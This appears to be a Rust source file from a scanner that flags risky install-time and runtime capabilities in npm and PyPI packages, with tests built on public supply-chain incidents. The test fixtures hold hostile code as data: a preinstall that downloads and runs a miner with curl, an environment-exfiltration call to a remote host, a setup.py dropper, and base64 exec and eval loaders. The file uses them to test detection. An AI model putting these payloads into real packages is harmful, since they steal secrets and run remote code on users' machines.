        (Some(previous), _) if cached(root, &used.sum).is_some() => {
            let current = Archive {
                url: String::new(),
                filename: String::new(),
                sum: used.sum.clone(),
            };
            (current, previous)
        }
        (_, Some(f)) => {
            let found = match used.ecosystem {
                Ecosystem::Npm => npm_archives(f, &used.name, &used.version, &used.sum)?,
                _ => pypi_archives(f, &used.name, &used.version, &used.sum)?,
            };
            store_link(root, &used.sum, found.1.as_ref());
            found
        }
        (_, None) => {
            return Err(
                "not in the capability cache, and offline or no network feature".to_string(),
            )
        }
    };
    let profile = profile_of(used.ecosystem, &current, fetch, root)?;
    let previous = match previous {
        Some((v, archive)) => Some((v, profile_of(used.ecosystem, &archive, fetch, root)?)),
        None => None,
    };
    Ok(alerts(
        &profile,
        previous.as_ref().map(|(v, p)| (v.as_str(), p)),
    ))
}

/// What `scan --capabilities` found, and what it could not read.
#[derive(Debug, Default)]
pub struct Outcome {
    pub findings: Vec<WarnFinding>,
    pub notes: Vec<String>,
    pub read: usize,
}

fn slug(ecosystem: Ecosystem) -> &'static str {
    match ecosystem {
        Ecosystem::Npm => "npm",
        _ => "pypi",
    }
}

/// `scan --capabilities`: the alerts for every pinned npm and PyPI package of the fleet.
///
/// # Errors
///
/// When the downloads cannot run at all.
pub fn scan(repos: &[Repo], offline: bool) -> Result<Outcome, String> {
    let client = if offline {
        None
    } else {
        crate::health::archive_client()
    };
    let pool = rayon::ThreadPoolBuilder::new()
        .num_threads(DOWNLOADS_AT_ONCE)
        .build()
        .map_err(|e| e.to_string())?;
    Ok(pool.install(|| scan_with(repos, client.as_deref(), cache_root().as_deref())))
}

fn scan_with(repos: &[Repo], fetch: Option<&dyn Fetch>, root: Option<&Path>) -> Outcome {
    let mut uses: BTreeMap<Used, Vec<Occurrence>> = BTreeMap::new();
    let mut unpinned = 0usize;
    for repo in repos {
        let mut inv = crate::inventory::repo_inventory(repo);
        crate::lockhash::annotate(&mut inv, &repo.path);
        for source in &inv.sources {
            if !matches!(source.ecosystem, Ecosystem::Npm | Ecosystem::Pypi) {
                continue;
            }
            for p in &source.packages {
                if !crate::health::is_public(source.ecosystem, p) {
                    continue;
                }
                let pin = p.checksums.iter().find(|c| match source.ecosystem {
                    Ecosystem::Npm => c.algorithm == "SHA-512",
                    _ => c.algorithm == "SHA-256",
                });
                let Some(sum) = pin else {
                    unpinned += 1;
                    continue;
                };
                uses.entry(Used {
                    ecosystem: source.ecosystem,
                    name: p.name.clone(),
                    version: p.version.clone(),
                    sum: sum.clone(),
                })
                .or_default()
                .push(occurrence(&inv.repo, p));
            }
        }
    }
    let keys: Vec<&Used> = uses.keys().collect();
    let results: Vec<Result<Vec<Alert>, String>> = keys
        .par_iter()
        .map(|u| package_alerts(u, fetch, root))
        .collect();
    let mut outcome = Outcome::default();
    if unpinned > 0 {
        outcome.notes.push(format!(
            "{unpinned} package(s) have no SHA-512 (npm) or SHA-256 (PyPI) hash in their lockfile and were not read"
        ));
    }
    let mut failed = Vec::new();
    for (used, result) in keys.into_iter().zip(results) {
        match result {
            Ok(alerts) => {
                outcome.read += 1;
                for alert in alerts {
                    let mut occurrences = uses.get(used).cloned().unwrap_or_default();
                    occurrences.sort_by_cached_key(|o| format!("{o:?}"));
                    occurrences.dedup();
                    outcome.findings.push(WarnFinding {
                        kind: WarnKind::Notice,
                        advisory_id: Some(format!(
                            "fleetreach:{}:{}/{}@{}",
                            alert.signal,
                            slug(used.ecosystem),
                            used.name,
                            used.version
                        )),
                        title: format!(
                            "{} package {} {} {}",
                            slug(used.ecosystem),
                            used.name,
                            used.version,
                            alert.detail
                        ),
                        occurrences,
                    });
                }
            }
            Err(e) => failed.push(format!("{} {}: {e}", used.name, used.version)),
        }
    }
    outcome.notes.insert(
        0,
        format!(
            "read {} npm and PyPI package version(s), {} warning(s)",
            outcome.read,
            outcome.findings.len()
        ),
    );
    if !failed.is_empty() {
        outcome.notes.push(format!(
            "{} package(s) not read: {}{}",
            failed.len(),
            failed
                .iter()
                .take(5)
                .cloned()
                .collect::<Vec<_>>()
                .join("; "),
            if failed.len() > 5 { "; ..." } else { "" }
        ));
    }
    outcome
}

fn occurrence(repo: &RepoId, p: &fleetreach_core::inventory::Package) -> Occurrence {
    Occurrence::InRepo {
        repo: repo.clone(),
        package: p.name.clone(),
        installed: crate::signals::lenient_version(&p.version),
        patched: Vec::new(),
        dependency_kind: if p.direct {
            DependencyKind::Direct
        } else {
            DependencyKind::Transitive
        },
        dependency_path: Vec::new(),
        active: None,
        source: Default::default(),
        scope: Default::default(),
        layer: None,
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    //! Fixtures modelled on public incident reports, built here as archives: no real sample
    //! is downloaded or kept.
    use super::*;
    use std::io::Write;
    use std::sync::Mutex;

    fn tgz(files: &[(&str, &str)]) -> Vec<u8> {
        let gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
        let mut tar = tar::Builder::new(gz);
        for (path, body) in files {
            let mut header = tar::Header::new_gnu();
            header.set_size(body.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            tar.append_data(&mut header, path, body.as_bytes()).unwrap();
        }
        tar.into_inner().unwrap().finish().unwrap()
    }

    fn wheel(files: &[(&str, &str)]) -> Vec<u8> {
        let mut zip = zip::ZipWriter::new(Cursor::new(Vec::new()));
        for (path, body) in files {
            zip.start_file(*path, zip::write::SimpleFileOptions::default())
                .unwrap();
            zip.write_all(body.as_bytes()).unwrap();
        }
        zip.finish().unwrap().into_inner()
    }

    fn signals(alerts: &[Alert]) -> BTreeSet<String> {
        alerts.iter().map(|a| a.signal.clone()).collect()
    }

    fn set(items: &[&str]) -> BTreeSet<String> {
        items.iter().map(|s| (*s).to_string()).collect()
    }

    /// A random-looking base64 payload, as an encrypted second stage would be.
    fn payload(len: usize) -> String {
        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut x: u64 = 0x9e37_79b9_7f4a_7c15;
        (0..len)
            .map(|_| {
                x ^= x << 13;
                x ^= x >> 7;
                x ^= x << 17;
                alphabet[(x % 64) as usize] as char
            })
            .collect()
    }

    #[test]
    fn flatmap_stream_style_payload_is_new_eval_and_entropy() {
        // event-stream 3.3.6 pulled flatmap-stream 0.1.1, which added an AES-encrypted
        // payload decrypted with an env-derived key and run through `module._compile`.
        let before = tgz(&[
            ("package/package.json", r#"{"name":"flatmap-stream","version":"0.1.0"}"#),
            ("package/index.js", "var Stream = require('stream').Stream\nmodule.exports = function (fn) { return new Stream() }\n"),
        ]);
        let after_src = format!(
            "var Stream = require('stream').Stream\nvar crypto = require('crypto')\nvar k = process.env.npm_package_description\nvar d = crypto.createDecipher('aes256', k)\nvar n = new Function('m', d.update(\"{}\", 'hex', 'utf8'))\nmodule.exports = function (fn) {{ return new Stream() }}\n",
            payload(900)
        );
        let after = tgz(&[
            (
                "package/package.json",
                r#"{"name":"flatmap-stream","version":"0.1.1"}"#,
            ),
            ("package/index.min.js", &after_src),
        ]);
        let (b, a) = (npm_profile(&before).unwrap(), npm_profile(&after).unwrap());
        let got = signals(&alerts(&a, Some(("0.1.0", &b))));
        assert_eq!(got, set(&["adds-env", "adds-eval", "adds-high-entropy"]));
    }

    #[test]
    fn ua_parser_style_preinstall_downloads_and_runs() {
        // ua-parser-js 0.7.29 added a preinstall that ran a script fetching and starting a
        // miner with curl/wget through child_process.
        let before = tgz(&[
            (
                "package/package.json",
                r#"{"name":"ua-parser-js","version":"0.7.28","main":"src/ua-parser.js"}"#,
            ),
            (
                "package/src/ua-parser.js",
                "(function (window) { var UAParser = function () {} })(this)\n",
            ),
        ]);
        let after = tgz(&[
            ("package/package.json", r#"{"name":"ua-parser-js","version":"0.7.29","scripts":{"preinstall":"start /B node preinstall.js & node preinstall.js"}}"#),
            ("package/src/ua-parser.js", "(function (window) { var UAParser = function () {} })(this)\n"),
            ("package/preinstall.js", "const { exec } = require('child_process');\nexec('curl http://159.148.186.228/download/jsextension -o jsextension; chmod +x jsextension; ./jsextension &');\n"),
        ]);
        let (b, a) = (npm_profile(&before).unwrap(), npm_profile(&after).unwrap());
        let got = signals(&alerts(&a, Some(("0.7.28", &b))));
        assert_eq!(
            got,
            set(&[
                "adds-install-install-script",
                "adds-install-network",
                "adds-install-shell",
                "install-network",
                "install-shell",
            ])
        );
        let detail = &alerts(&a, Some(("0.7.28", &b)))[0].detail;
        assert!(detail.contains("(0.7.28 had none)"), "{detail}");
    }

    #[test]
    fn node_ipc_style_update_adds_filesystem_and_network() {
        // node-ipc 10.1.1 added a geo-IP lookup over https and recursive file overwrites,
        // with the strings base64-encoded.
        let before = tgz(&[
            (
                "package/package.json",
                r#"{"name":"node-ipc","version":"10.1.0"}"#,
            ),
            (
                "package/node-ipc.js",
                "import Defaults from './entities/Defaults.js';\nexport default class IPC {}\n",
            ),
            (
                "package/entities/Defaults.js",
                "export default class Defaults {}\n",
            ),
        ]);
        let after = tgz(&[
            ("package/package.json", r#"{"name":"node-ipc","version":"10.1.1"}"#),
            ("package/node-ipc.js", "import Defaults from './entities/Defaults.js';\nimport './dao/ssl-geospec.js';\nexport default class IPC {}\n"),
            ("package/entities/Defaults.js", "export default class Defaults {}\n"),
            ("package/dao/ssl-geospec.js", "import u from 'path';import a from 'fs';import o from 'https';\nconst h = Buffer.from('aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pbw==', 'base64');\no.get(h.toString(), r => { a.writeFileSync(u.join('.', 'x'), '\\u2764') });\n"),
        ]);
        let (b, a) = (npm_profile(&before).unwrap(), npm_profile(&after).unwrap());
        assert_eq!(
            signals(&alerts(&a, Some(("10.1.0", &b)))),
            set(&["adds-filesystem", "adds-network"])
        );
    }

    #[test]
    fn ctx_style_release_exfiltrates_the_environment() {
        // ctx 0.2.2 on PyPI (2022) sent os.environ to a remote host with requests.
        let before = wheel(&[("ctx.py", "class Ctx(dict):\n    pass\n")]);
        let after = wheel(&[(
            "ctx.py",
            "import os\nimport requests\nclass Ctx(dict):\n    def __init__(self):\n        requests.get('https://anti-theft-web.herokuapp.com/hacked/' + str(dict(os.environ)))\n",
        )]);
        let (b, a) = (
            pypi_profile(&before, "ctx-0.1.2-py3-none-any.whl").unwrap(),
            pypi_profile(&after, "ctx-0.2.2-py3-none-any.whl").unwrap(),
        );
        assert_eq!(
            signals(&alerts(&a, Some(("0.1.2", &b)))),
            set(&["adds-env", "adds-network"])
        );
    }

    #[test]
    fn a_pth_startup_hook_is_install_time_and_obfuscated() {
        // Malicious wheels have shipped a `.pth` that runs a base64 payload at every start.
        let line = format!(
            "import os, base64; exec(base64.b64decode('{}'))\n",
            payload(64)
        );
        let whl = wheel(&[("pkg/__init__.py", ""), ("pkg-init.pth", &line)]);
        let p = pypi_profile(&whl, "pkg-1.0.0-py3-none-any.whl").unwrap();
        let got = signals(&alerts(&p, None));
        assert_eq!(got, set(&["install-eval", "install-obfuscated"]));
        assert!(p.has(Cap::InstallScript, When::Install).is_some());
        // A plain path entry runs nothing.
        let plain = wheel(&[("pkg.pth", "./src\n")]);
        assert_eq!(
            pypi_profile(&plain, "pkg-1.0.0-py3-none-any.whl").unwrap(),
            Profile::default()
        );
    }

    #[test]
    fn a_setup_py_dropper_stands_on_its_own() {
        // The most common PyPI pattern: setup.py downloads and starts a binary at install.
        let sdist = tgz(&[
            ("evil-0.1/setup.py", "from setuptools import setup\nimport subprocess, urllib.request\nurllib.request.urlretrieve('http://x/a.exe', 'a.exe')\nsubprocess.Popen(['a.exe'])\nsetup(name='evil')\n"),
            ("evil-0.1/evil/__init__.py", ""),
        ]);
        let p = pypi_profile(&sdist, "evil-0.1.tar.gz").unwrap();
        assert_eq!(signals(&alerts(&p, None)), set(&["build-network"]));
        // A C extension's compiler call is the norm; it counts only when a version adds it.
        let build = tgz(&[("ext-1.0/setup.py", "import subprocess\nsubprocess.check_output(['pkg-config', '--cflags', 'x'])\nexec(open('ext/version.py').read())\n")]);
        let p = pypi_profile(&build, "ext-1.0.tar.gz").unwrap();
        assert!(alerts(&p, None).is_empty());
        assert_eq!(
            signals(&alerts(&p, Some(("0.9", &Profile::default())))),
            set(&[
                "adds-build-shell",
                "adds-build-eval",
                "adds-build-filesystem"
            ])
        );
    }

    #[test]
    fn obfuscator_output_and_native_binaries_are_seen() {
        let names: String = (0..30)
            .map(|i| format!("var _0x{:04x}=1;", 0x1a2b + i))
            .collect();
        let t = tgz(&[
            ("package/package.json", "{}"),
            ("package/lib.js", &names),
            ("package/bin/tool", "\u{7f}ELF........"),
        ]);
        let p = npm_profile(&t).unwrap();
        assert_eq!(p.has(Cap::Obfuscated, When::Runtime), Some("lib.js"));
        assert_eq!(p.has(Cap::NativeCode, When::Runtime), Some("bin/tool"));
        assert_eq!(signals(&alerts(&p, None)), set(&["obfuscated"]));
    }

    #[test]
    fn ordinary_code_trips_nothing_that_stands_alone() {
        let font = format!("const f = \"data:font/woff2;base64,{}\";\n", payload(4000));
        let t = tgz(&[
            (
                "package/package.json",
                r#"{"scripts":{"test":"curl x","prepare":"sh build.sh"}}"#,
            ),
            ("package/a.js", &font),
            (
                "package/b.js",
                "obj.eval(x); client.fetch(y); const evaluate = 1; exec_command(z);\n",
            ),
        ]);
        let p = npm_profile(&t).unwrap();
        assert_eq!(
            p,
            Profile::default(),
            "data URIs, methods and non-install scripts are not capabilities"
        );
        let py = wheel(&[(
            "m.py",
            "def f(c):\n    c.exec(q)\n    self.open()\n    eval_model(x)\n",
        )]);
        assert_eq!(
            pypi_profile(&py, "m-1-py3-none-any.whl").unwrap(),
            Profile::default()
        );
    }

    #[test]
    fn text_around_a_long_string_may_be_any_unicode() {
        // Found on the top-1,000 run: a full-width digit just before a long literal.
        let src = format!(
            "const a = '\u{ff19}{}'; const b = \"{}\";",
            "ữ".repeat(30),
            payload(600)
        );
        assert!(high_entropy(&src));
        let near = format!("{}\"{}\"", "ữ".repeat(25), payload(600));
        assert!(high_entropy(&near));
    }

    #[test]
    fn tests_docs_and_examples_are_not_read() {
        for path in [
            "pkg/tests/x.py",
            "pkg/conftest.py",
            "test_a.py",
            "docs/code/a.py",
            "lib/a.spec.js",
            "__tests__/a.js",
            "examples/net.js",
        ] {
            assert!(not_run(path), "{path}");
        }
        for path in [
            "pkg/contest.py",
            "lib/attest.js",
            "src/testimony.py",
            "index.js",
        ] {
            assert!(!not_run(path), "{path}");
        }
    }

    #[test]
    fn install_files_follow_relative_requires() {
        let t = tgz(&[
            (
                "package/package.json",
                r#"{"scripts":{"postinstall":"node scripts/post.js"}}"#,
            ),
            ("package/scripts/post.js", "require('./lib/net')\n"),
            (
                "package/scripts/lib/net.js",
                "const https = require('https')\n",
            ),
            ("package/index.js", "const https = require('node:https')\n"),
        ]);
        let p = npm_profile(&t).unwrap();
        assert_eq!(
            p.has(Cap::Network, When::Install),
            Some("scripts/lib/net.js")
        );
        assert_eq!(p.has(Cap::Network, When::Runtime), Some("index.js"));
    }

    #[test]
    fn the_previous_release_skips_pre_releases_unless_current_is_one() {
        let v = |s: &str| fleetreach_core::semver::Version::parse(s).unwrap();
        let all = [
            "1.0.0",
            "1.1.0-beta.1",
            "1.1.0",
            "1.2.0-rc.1",
            "1.2.0",
            "2.0.0",
        ];
        let iter = || all.iter().map(|s| (v(s), !v(s).pre.is_empty()));
        assert_eq!(previous_of(iter(), &v("1.2.0"), false), Some(v("1.1.0")));
        assert_eq!(
            previous_of(iter(), &v("1.2.0"), true),
            Some(v("1.2.0-rc.1"))
        );
        assert_eq!(previous_of(iter(), &v("1.0.0"), false), None);
        assert_eq!(pypi_kind("a-1.0-py3-none-any.whl"), "py3-none-any");
        assert_eq!(
            pypi_kind("a-1.0-1-cp312-cp312-manylinux_2_17_x86_64.whl"),
            "cp312-cp312-manylinux_2_17_x86_64"
        );
        assert_eq!(pypi_kind("a-1.0.tar.gz"), "sdist");
    }

    #[derive(Default)]
    struct Fake {
        bodies: BTreeMap<String, Vec<u8>>,
        asked: Mutex<Vec<String>>,
    }

    impl Fetch for Fake {
        fn get(&self, url: &str) -> Result<Option<Vec<u8>>, String> {
            self.asked.lock().unwrap().push(url.to_string());
            Ok(self.bodies.get(url).cloned())
        }
        fn github(&self, url: &str) -> Result<Option<Vec<u8>>, String> {
            self.get(url)
        }
        fn has_github_token(&self) -> bool {
            false
        }
    }

    fn integrity(body: &[u8]) -> String {
        use base64::Engine as _;
        format!(
            "sha512-{}",
            base64::engine::general_purpose::STANDARD.encode(Sha512::digest(body))
        )
    }

    #[test]
    fn a_fleet_scan_reads_both_releases_checks_hashes_and_caches() {
        let old = tgz(&[
            (
                "package/package.json",
                r#"{"name":"pad","version":"1.0.0"}"#,
            ),
            ("package/index.js", "module.exports = 1\n"),
        ]);
        let new = tgz(&[
            (
                "package/package.json",
                r#"{"name":"pad","version":"1.0.1","scripts":{"postinstall":"node i.js"}}"#,
            ),
            ("package/index.js", "module.exports = 1\n"),
            ("package/i.js", "require('https').get('https://x')\n"),
        ]);
        let packument = serde_json::json!({"versions": {
            "1.0.0": {"dist": {"tarball": "https://registry.npmjs.org/pad/-/pad-1.0.0.tgz", "integrity": integrity(&old)}},
            "1.0.1": {"dist": {"tarball": "https://registry.npmjs.org/pad/-/pad-1.0.1.tgz", "integrity": integrity(&new)}},
        }});
        let mut fake = Fake::default();
        fake.bodies.insert(
            "https://registry.npmjs.org/pad".into(),
            serde_json::to_vec(&packument).unwrap(),
        );
        fake.bodies.insert(
            "https://registry.npmjs.org/pad/-/pad-1.0.0.tgz".into(),
            old.clone(),
        );
        fake.bodies.insert(
            "https://registry.npmjs.org/pad/-/pad-1.0.1.tgz".into(),
            new.clone(),
        );
        let dir = tempfile::tempdir().unwrap();
        let repo_dir = dir.path().join("app");
        std::fs::create_dir(&repo_dir).unwrap();
        let lock = serde_json::json!({"name": "app", "lockfileVersion": 3, "packages": {
            "": {"name": "app", "dependencies": {"pad": "^1.0.0"}},
            "node_modules/pad": {"version": "1.0.1", "resolved": "https://registry.npmjs.org/pad/-/pad-1.0.1.tgz", "integrity": integrity(&new)},
        }});
        std::fs::write(
            repo_dir.join("package-lock.json"),
            serde_json::to_vec(&lock).unwrap(),
        )
        .unwrap();
        std::fs::write(
            repo_dir.join("package.json"),
            r#"{"name":"app","dependencies":{"pad":"^1.0.0"}}"#,
        )
        .unwrap();
        let repos = vec![Repo {
            id: RepoId("app".into()),
            path: repo_dir.clone(),
            glob: false,
            glob_max_depth: 0,
            vex_product_id: None,
            ecosystem: None,
        }];
        let cache = dir.path().join("cache");
        let out = scan_with(&repos, Some(&fake), Some(&cache));
        assert_eq!(out.read, 1, "{:?}", out.notes);
        let ids: BTreeSet<String> = out
            .findings
            .iter()
            .filter_map(|f| f.advisory_id.clone())
            .collect();
        assert!(
            ids.contains("fleetreach:adds-install-network:npm/pad@1.0.1"),
            "{ids:?}"
        );
        assert!(
            ids.contains("fleetreach:install-network:npm/pad@1.0.1"),
            "{ids:?}"
        );
        let title = &out
            .findings
            .iter()
            .find(|f| {
                f.advisory_id.as_deref() == Some("fleetreach:adds-install-network:npm/pad@1.0.1")
            })
            .unwrap()
            .title;
        assert_eq!(
            title,
            "npm package pad 1.0.1 adds network access to install-time code (1.0.0 had none): i.js"
        );
        // Offline, from the cache alone: the same findings, nothing asked.
        let again = scan_with(&repos, None, Some(&cache));
        assert_eq!(again.read, 1, "{:?}", again.notes);
        assert_eq!(again.findings, out.findings);
        // A registry file that does not match its hash is never read.
        let mut bad = Fake {
            bodies: fake.bodies.clone(),
            ..Default::default()
        };
        bad.bodies.insert(
            "https://registry.npmjs.org/pad/-/pad-1.0.0.tgz".into(),
            new.clone(),
        );
        let fresh = dir.path().join("cache2");
        let out = scan_with(&repos, Some(&bad), Some(&fresh));
        assert!(
            out.notes
                .iter()
                .any(|n| n.contains("does not match its hash")),
            "{:?}",
            out.notes
        );
    }

    /// The benign-rate harness (spec 16, row 19 proof): `FR_RATES=<list> FR_RATES_OUT=<jsonl>
    /// FR_RATES_CACHE=<dir>`, the list holding `npm <name>` and `pypi <name>` lines. Each
    /// package's latest release is read as a fleet scan would read it.
    #[test]
    #[ignore = "network: downloads real archives"]
    fn live_rates() {
        const MAX: u64 = 50 << 20;
        struct Capped<'a> {
            inner: &'a dyn Fetch,
            big: Mutex<BTreeSet<String>>,
        }
        impl Fetch for Capped<'_> {
            fn get(&self, url: &str) -> Result<Option<Vec<u8>>, String> {
                if self.big.lock().unwrap().contains(url) {
                    return Err("over 50 MB, skipped".to_string());
                }
                let body = self.inner.get(url)?;
                if url.starts_with("https://pypi.org/pypi/") {
                    if let Some(doc) = body
                        .as_deref()
                        .and_then(|b| serde_json::from_slice::<Value>(b).ok())
                    {
                        let mut big = self.big.lock().unwrap();
                        for files in doc["releases"]
                            .as_object()
                            .into_iter()
                            .flat_map(|r| r.values())
                        {
                            for f in files.as_array().into_iter().flatten() {
                                if f["size"].as_u64().is_some_and(|s| s > MAX) {
                                    if let Some(u) = f["url"].as_str() {
                                        big.insert(u.to_string());
                                    }
                                }
                            }
                        }
                    }
                }
                Ok(body)
            }
            fn github(&self, url: &str) -> Result<Option<Vec<u8>>, String> {
                self.get(url)
            }
            fn has_github_token(&self) -> bool {
                false
            }
        }
        let list = std::fs::read_to_string(std::env::var("FR_RATES").unwrap()).unwrap();
        let root = PathBuf::from(std::env::var("FR_RATES_CACHE").unwrap());
        let http = crate::health::archive_client().expect("a network build");
        let fetch = Capped {
            inner: http.as_ref(),
            big: Mutex::new(BTreeSet::new()),
        };
        let latest = |eco: &str, name: &str| -> Result<Used, String> {
            if eco == "npm" {
                let url = format!("https://registry.npmjs.org/{}", name.replace('/', "%2f"));
                let doc: Value = serde_json::from_slice(&fetch.get(&url)?.ok_or("gone")?)
                    .map_err(|e| e.to_string())?;
                let version = doc["dist-tags"]["latest"]
                    .as_str()
                    .ok_or("no latest")?
                    .to_string();
                let sum = npm_integrity(
                    doc["versions"][&version]["dist"]["integrity"]
                        .as_str()
                        .ok_or("no integrity")?,
                )
                .ok_or("no sha512")?;
                Ok(Used {
                    ecosystem: Ecosystem::Npm,
                    name: name.to_string(),
                    version,
                    sum,
                })
            } else {
                let url = format!("https://pypi.org/pypi/{name}/json");
                let doc: Value = serde_json::from_slice(&fetch.get(&url)?.ok_or("gone")?)
                    .map_err(|e| e.to_string())?;
                let version = doc["info"]["version"]
                    .as_str()
                    .ok_or("no version")?
                    .to_string();
                let files = doc["releases"][&version]
                    .as_array()
                    .cloned()
                    .unwrap_or_default();
                let pick = files
                    .iter()
                    .find(|f| {
                        f["filename"]
                            .as_str()
                            .is_some_and(|n| n.ends_with("-none-any.whl"))
                    })
                    .or_else(|| files.iter().find(|f| f["packagetype"] == "sdist"))
                    .or_else(|| files.first())
                    .ok_or("no files")?;
                let sum = Checksum::new(
                    "SHA-256",
                    pick["digests"]["sha256"].as_str().ok_or("no sha256")?,
                )
                .ok_or("bad sha256")?;
                Ok(Used {
                    ecosystem: Ecosystem::Pypi,
                    name: name.to_string(),
                    version,
                    sum,
                })
            }
        };
        let lines: Vec<(&str, &str)> = list.lines().filter_map(|l| l.split_once(' ')).collect();
        let pool = rayon::ThreadPoolBuilder::new()
            .num_threads(DOWNLOADS_AT_ONCE)
            .build()
            .unwrap();
        let out: Vec<String> = pool.install(|| {
            lines
                .par_iter()
                .map(|(eco, name)| {
                    let result = latest(eco, name).and_then(|used| {
                        let prev = cached_link(Some(&root), &used.sum);
                        package_alerts(&used, Some(&fetch), Some(&root)).map(|a| (used, a, prev))
                    });
                    match result {
                        Ok((used, alerts, _)) => serde_json::json!({
                            "eco": eco, "name": name, "version": used.version,
                            "previous": cached_link(Some(&root), &used.sum).flatten().map(|(v, _)| v),
                            "signals": alerts.iter().map(|a| a.signal.clone()).collect::<Vec<_>>(),
                            "details": alerts.iter().map(|a| a.detail.clone()).collect::<Vec<_>>(),
                        }),
                        Err(e) => serde_json::json!({"eco": eco, "name": name, "error": e}),
                    }
                    .to_string()
                })
                .collect()
        });
        std::fs::write(
            std::env::var("FR_RATES_OUT").unwrap(),
            out.join("\n") + "\n",
        )
        .unwrap();
    }
}
